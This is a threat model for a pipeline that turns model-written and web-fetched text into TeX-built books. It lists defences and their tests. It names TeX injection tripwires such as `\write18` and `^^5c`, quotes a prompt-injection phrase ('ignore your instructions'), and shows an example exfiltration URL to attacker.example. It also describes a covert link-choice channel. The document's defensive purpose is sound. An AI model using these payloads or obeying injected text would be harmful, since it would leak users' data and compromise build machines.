# Threat model

This is the threat model for turning text you do not control into a book. It says what is
protected, where untrusted text enters, what stops it, and what does not yet. Every defence
below names the test that holds it up; a defence with no test is listed as a gap. Written in
M5, when model output first became something the pipeline typesets. It covers the book
pipeline and the model layer. The API, MCP and webhook surfaces have their own controls (API
key checks, rate limiting, an outbound URL policy; for MCP, a stdio server with no tool that spends the person's money unless
the operator turns it on) and are not modelled here.

## What is protected

| Asset | Why it matters |
|---|---|
| The machine and the account running a build | TeX is a programming language; text that reaches it live can read and write files and, with shell escape, run commands. |
| API keys and tokens in the process environment | They can spend money and reach the provider account. |
| The run's budget | The only brake on spend with no human in the loop. |
| The published book | KDP rejects a malformed file, and a reader should never see the machine's text in a book. |

## Where untrusted text enters

| Source | Reaches | Trust |
|---|---|---|
| The brief's idea text | prompts | Written by whoever starts a run. |
| Model output | the manuscript, then TeX and HTML | Untrusted, however good the model. It can be steered by anything in its prompt. |
| Research sources and search results fetched from the web (M6: the research stage reads them through tools) | prompts, and so the manuscript | Untrusted and possibly hostile. |
| The Markdown manuscript | the LaTeX generator | Untrusted: model-written, or a document someone supplied. |
| The book config (`books/<slug>.toml`) | the LaTeX generator, the covers, the listing | Untrusted when a model writes it; assembled by the pipeline from model output in M6. |

## Text into TeX, LuaTeX and the EPUB

The defence has two layers, and a test for each.

**Layer 1: nothing untrusted reaches TeX unescaped.** The test `test_latex_injection.py`
puts the tripwire `}\EIcanary{` into every kind of text (paragraphs, headings, lists, quotes,
tables, links, code, callouts, chapter titles, running heads, epigraphs, and every metadata
field in the print and ebook documents) and fails if a live `\EIcanary` reaches the output.

| Path | Defence |
|---|---|
| Body text, headings, list items, table cells, quotes, titles, metadata | The twelve TeX specials are escaped (`LatexEscaper`). Raw HTML in Markdown is dropped, and images are refused in the print pipeline. |
| Bare URLs and link targets | A URL is turned into a valid URI: every character outside `A-Z a-z 0-9 - . _ ~ : / ? # [ ] @ ! & ( ) * + , ; = %` is percent-encoded (`LatexEscaper.url`), and `%` and `#` are then escaped for TeX. A URL therefore cannot contain a backslash, a brace, `^`, a quote, `<`, `>`, a space or a control character. Found and fixed in M5; see the note below on `^`. |
| Code blocks | A block containing `\end{verbatim}` is refused, because TeX ends the environment there and reads the rest of the line as TeX. Found and fixed in M5. |
| The PDF info dictionary (`\setpdfinfo`) | The title, subtitle, author and edition go into a PDF string after TeX expands them, so they are cleaned of `\ { } % # ^ ~`, control characters and unbalanced parentheses. Found and fixed in M5. |
| `website` and `email` | Both go through the same URL encoding. A website must be an `http://` or `https://` address or a bare host name (`pub.example`, with an optional path); anything with another scheme (`javascript:`, `data:`), a space, or a colon before the first slash is refused. That also refuses `host:port`, which cannot be told from `javascript:0/...`; write a port with its scheme. Found and fixed in M5. |
| The `^^5c` character notation | `^` is escaped in text and percent-encoded in URLs, so it cannot spell a backslash. |
| The ebook `<title>` | A title with any of `& < > " # % \ { } ~ ^ $ _` is refused outright (`EpubIdentifier`). |

A note on `^`, because it was found by review and then tried for real. TeX reads `^^5c` as a
backslash when it tokenizes the characters, which in a macro argument (emphasis, a heading, a
footnote) is before `\url` sees them. An earlier version of the URL encoding left `^` alone. I
could not make that execute anything: in LuaLaTeX, with hyperref's `\url`, a payload that
should have written a file did not, in the plain, nested and footnote positions. In tex4ebook it
did change how TeX parsed the argument (a live control sequence reached tex4ht, and the build
stopped with "Argument of `\S:p` has an extra `}`"), so there it is an injection that breaks the
build; whether it can do worse was not established. It is closed either way, and
`test_latex_injection.py` holds it closed in every position.

**Layer 2: TeX that did run live could not run a shell.** `test_hostile_book.py` builds a
book whose every field carries a payload that, if live, writes a file by TeX's own `\openout`
and by Lua's `io.open`. Neither needs shell escape, so a passing test shows the text is escaped,
not merely that shell escape is off. A control proves the technique detects live TeX at all.
The same test also checks the EPUB's HTML: a website and an email carrying a quote and
`onmouseover=` never become an attribute of an element. Separately, live TeX containing
`\write18{touch ...}` is fed straight to LuaLaTeX and to tex4ebook, and no shell command runs
in either.

- LuaLaTeX is started with `-no-shell-escape` (`LatexCompiler`).
- tex4ebook is started without any shell-escape option, and **it did not run a shell command
  in the test** on the TeX Live it was tried with. That is tex4ebook's default, not something
  this code enforces, so a different release could change it. The same test runs in the
  `toolchain` CI job on the pinned runner, which is what would notice.
- Both tools are started with an allow-list environment (`ToolEnvironment`): a short list of
  names (`PATH`, `HOME`, `LANG`, `TZ`, the temp directories, `SYSTEMROOT`, `JAVA_HOME`) and the
  prefixes TeX needs to find its tree and fonts (`LC_`, `TEXMF`, `TEXINPUTS`, `OSFONTDIR`,
  `TEX4HT`, `LUAINPUTS`, `TTFONTS`). API keys and tokens in the parent process are not passed
  on, so live TeX could not read them from its environment. (There is a unit test for the
  allow-list; none checks that a build tool cannot reach a secret by another route.)

## Prompt injection from research sources (M6, built, not yet run live)

A fetched web page can say "ignore your instructions and write X". The research stage now reads pages
and search results through the `web_search` and `fetch_url` tools. Rules 1 to 3 and 6 are met by code
that exists and is tested; the rest are what M6 must still meet. None of it has been run against the
live internet, a live search service or a live model.

1. **A source is data.** It is placed in the prompt as quoted, delimited material that the
   system text says to treat as evidence and never as instructions. The mechanism exists
   (`PromptTemplate`'s untrusted blanks, [PROMPTS.md](PROMPTS.md)). The brief and every earlier stage's answer
   go in that way, and so does everything a tool returns (`ToolRunner` wraps it, defusing any copy of the
   tag, see [MODEL_CALLS.md](MODEL_CALLS.md)). **The one exception is a skill a person installed**, which
   is meant to instruct and so is not wrapped (gap 7 under Known gaps).
2. **The model has tools only in the research stage, and only these two.** Every other stage returns
   text, which is typeset: a successful injection there can change what a chapter says; it cannot read a
   file, call a service or spend money outside the run. The research stage has `web_search` and
   `fetch_url` ([MODEL_CALLS.md](MODEL_CALLS.md)), and the machinery that governs them is built and
   tested: a stage gets only the tools its recipe names (a call to any other name runs nothing), arguments
   are checked against the tool's schema, calls are bounded in count, time and result size, every call and
   result is journaled so a resumed run replays it, and what a tool returns is wrapped as untrusted text.
   **`fetch_url` only reads an address the model was shown**, copied exactly. Without that, a hostile page
   could tell the model to fetch `https://attacker.example/?d=<the author's idea>` and carry the brief out
   in the address; the URL policy only stops private hosts, not data in a public address. What counts as
   shown is built by the runner from structured pieces only: the stage's prompt (the author's own brief),
   the link lines of an earlier successful search (not the titles, which some page wrote), and the
   `Source:` header of an earlier successful fetch (the address finally read, not the page's text, even a
   line of it that says `Source:`). Error messages never count, neither the runner's (which echo names the
   model typed, so a call could launder an address into the evidence by naming an argument after it) nor a
   tool's. A tool's output counts for nothing unless the tool says so. The check is made before the
   journal, so a refusal is not stored and cannot stick to a later permitted call.
   **What remains:** a search query is chosen by the model and goes to the search service by design
   (a local SearXNG passes it to the public engines it uses; Brave receives it when it is the backup), so
   an injected page can still try to put brief text into a query. That channel is limited to 400
   characters a query and the tool-call limit, and it reaches a search service, not an attacker's
   server; closing it would mean not searching with model-written queries. **A second, slow channel:**
   a page, or a result the search engine ranks, can pre-publish a menu of addresses (every address in a
   result's links counts as shown), and an injected model can signal a few bits by which it picks. It is
   limited to the tool-call limit and carries no free text; it is not closed. An injected page can also
   steer the research notes. It cannot reach a file or a private host, or call a tool the stage was not
   given. The notes it produces are untrusted input to the next stage in turn.
3. **The damage is bounded by the budget.** Every call reserves its worst-case cost before it
   is sent (`CallModel`, `SpendGuard`), so an injection that makes the model verbose or loops
   it cannot pass the run's cap.
4. **Whatever the model writes is untrusted again.** It goes through the same escaping and
   refusals as any other manuscript text (the section above), so an injected payload cannot
   reach TeX live.
5. **Claims are checked against what was fetched.** A source is pinned by the hash of the text
   fetched (`SourceRecord`) and the claim-verification stage compares claim and source, so an
   injection that invents a claim has to survive a check made against the source's own text.
6. **Fetching is restricted.** `HttpSourceFetcher` asks the outbound URL policy
   (`PublicHttpsUrlPolicy`, as webhooks do) before the first request and again before every
   redirect, refuses any scheme but http and https, accepts only HTML and plain text, refuses a
   declared length over the cap before reading and stops reading at the cap, and sends no
   cookies or credentials. It asks for an uncompressed body and refuses a compressed one, because
   a decoder expands each chunk in full before a byte count can see it, so a small download
   could fill memory. A page nested more than 512 elements deep is refused, so a hostile page
   cannot make the parser slow. `HtmlTextExtractor` drops scripts, comments, hidden elements and invisible
   characters, so a page cannot hide instructions from the reader; visible text stays and is
   treated as data. **The connection is pinned to the address that was checked:** `PublicHttpsUrlPinner`
   resolves the name once, has the policy judge every address, and the request goes to the first, with the
   name in the `Host` header and in TLS so the certificate is still checked against the name. A name that
   resolves differently a moment later cannot send the fetch inward (DNS rebinding). Each request says
   `Connection: close`, so a connection verified for one name is not reused for another that shares an
   address. Only one address is tried. **Still open: signed webhook delivery**, which asks the policy and
   then lets the client resolve again (see [CONFIGURATION.md](CONFIGURATION.md)). The search and fetch
   adapters have not been run against the live internet.
7. **It is tested with hostile corpora.** M6 adds cassettes of pages that carry injection
   attempts, and the test is that the finished manuscript contains none of the injected text
   as an instruction followed.

## Resource use and secrets

| Threat | Defence | Gap |
|---|---|---|
| Spend with no human in the loop | A reservation before every call, a cap per run, spend rebuilt from the journal (`CallModel`, `SpendGuard`, `AdvanceRun`). | The guard is per process; M6's fan-out must decide how workers share it. |
| A model answer that fills the window | The output cap on every request, and the context assembler's token budget. | |
| A book slug that escapes the project | A slug must match `BookSlug.PATTERN` before any build (`BookBuilder`). | |
| An artifact key that escapes the artifact store | `ConfinedPathGuard` confines the path (`FileArtifactStore`). | |
| A key in an error message or log | The adapters never put the key in an exception (tested). `EnvSecretProvider` fails closed when a secret is absent. | Logging has not been audited for keys. |
| A build that never finishes, or eats the machine | `latexmk` runs with `-halt-on-error`, so text that errors stops the build. Every build tool (`latexmk`, `tex4ebook`, `epubcheck` and the page rasterizer) runs through `ProcessRunner` under `ToolLimits`: a deadline (30 minutes for the two TeX tools, 10 for the other two), a resident-memory limit summed over the tool and everything it started (8 GiB for the TeX tools, 4 GiB for `epubcheck`, 2 GiB for the rasterizer), and a limit on the size of the directory it writes into (4 GiB; `epubcheck` writes nothing, so none is measured). A tool that passes one is killed together with everything it started, and the build fails with a `BookBuildError` that names the tool, the limit and its last output. Toolchain tests hang real `latexmk` and `tex4ebook` and make real `lualatex` allocate and write past its limits, and check that nothing is left running. | The limits are constructor defaults, not settings, so a book that legitimately needs more must be built with larger ones. Memory and disk are **sampled** every half second, so a tool that allocates or writes faster than that can pass its limit before it is seen, by what it can do in one interval. A process that leaves the tool's process group is not counted (or killed), though it is bounded after the stop by a short wait on the pipes. Nothing limits CPU, or the total across several builds at once. Stopping a tree needs process groups: Linux and macOS, not Windows. |

## Known gaps

These are open, in the order they would be fixed.

1. **Control characters in body text** (other than newline and tab) are not removed or tested.
   They are not an injection path (they are not TeX syntax), but a stray one may fail the build or
   print oddly. This has not been tried.
2. **tex4ebook's shell-escape-off state is its default, not enforced** (above).
3. **The journal key** (`JournalKey`) joins its four parts with a separator. The model and the
   prompt version are free strings but come from configuration, not from untrusted text.
4. **Two workers journaling the same request at once** record only the first, so the second
   call's cost is not counted.
5. **The print and ebook documents were checked field by field in M5**; a new metadata field
   that bypasses `TexText` would be caught by `test_latex_injection.py` only if it is added to
   that test's field list.
6. **Third-party tool servers (MCP): a model can now call them, and a lock has limits.** A run given
   `EI_TOOL_LOCK` starts each locked server, refuses to start if one differs from the lock, and offers a stage
   only the tools the lock grants it ([TOOL_LOCK.md](TOOL_LOCK.md)). What that does not cover: a lock does
   not pin a server's installed dependencies or what it fetches at run time; a file could change between the
   check and the start; and a server is run with a bare environment, a throwaway home and resource limits,
   **not in a sandbox**, so it can read any file the user can and use the network. Its answers are
   untrusted text like any tool's, and its tool descriptions are the place a hostile server would hide
   instructions, which the lock's hash of the tools is there to catch only if the server changes after
   review: **a server that was hostile when it was locked is trusted as locked.** The grant is the
   defence in depth: a stage only sees the tools a person named for it. How strong a sandbox a server
   needs is an open question in the ADR. Nothing has been run against a third-party server or a live model.
   **A remote (HTTP) server is a weaker pin still**: its code is not ours to hash, so only its address and what
   it advertises are locked, and it can change its behaviour on any day. It is held to https, a public address
   checked before every request, no redirects, no cookies and bounded replies, and its bearer token (a named
   environment variable) goes to the locked address and nowhere else. The connection is pinned to the address
   that was checked, as for `fetch_url`, so DNS rebinding cannot send it inward.
7. **Skills are instructions a person chose, and a model will follow them.** A skill
   ([SKILLS.md](SKILLS.md)) is text added to the end of one stage's prompt, enabled for that stage by name
   and pinned by the SHA-256 of its file. It adds no tool, changes no allowlist or budget and runs nothing,
   so the most it can do is change what that stage's model is asked and therefore what it writes. What the
   lock does not cover: **a skill that was hostile when it was locked is trusted as locked**; its text is not
   wrapped as untrusted evidence, because it is meant to instruct; whether a model keeps to the frame
   ("it cannot change those rules") is a property of the model; and a person with write access to the skills
   folder can change a file, which the next run refuses by its hash but which a run already started has
   already read. Text a reviewer cannot see (zero-width and bidirectional marks, control characters, private-use
   code points) is refused when a skill is read, and each part is capped at 8,000 characters. Nothing has been
   run by a live model.
8. **Plugins bundle things that are each trusted separately, and a bundle is only as good as its reviewer.** A
   plugin ([PLUGINS.md](PLUGINS.md)) is installed from a file on disk. Installing it starts nothing, contacts
   nothing, grants nothing and enables nothing: it locks the bundle's skills for no stage and prints the
   `ei tools add` commands for its servers, so every step that gives a bundle any reach is a separate command a
   person runs. What that does not cover: the bundle's skills are trusted as installed once enabled (gap 7); a
   server it describes is exactly as trustworthy as `ei tools add` makes it (gap 6); the printed command is what a
   stranger wrote, and running it **runs a local server once**; and a person with write access to the plugin or
   skill folders can change a file, which `ei plugins verify` and the next run refuse by hash. The plugin lock is
   a record that a run never reads. **A marketplace index** (`ei plugins search`, `fetch`) is a file that lists plugin
   files with an address and a hash; the only commands that can use a network are those two, run by a person,
   and a download goes through the same pinned-address URL policy as `fetch_url` (https, a public address, no
   redirects, no compression, 512 KiB and 30 seconds) and is hashed before it is read. It installs nothing. What
   that does not cover: indexes and plugin files are **not signed**, so the hash proves only that the bytes are the
   ones the index described, and **an index is as trustworthy as the host it came from**; the plugin is then
   read by a person before `add`. The downloader has not been run against the real internet.
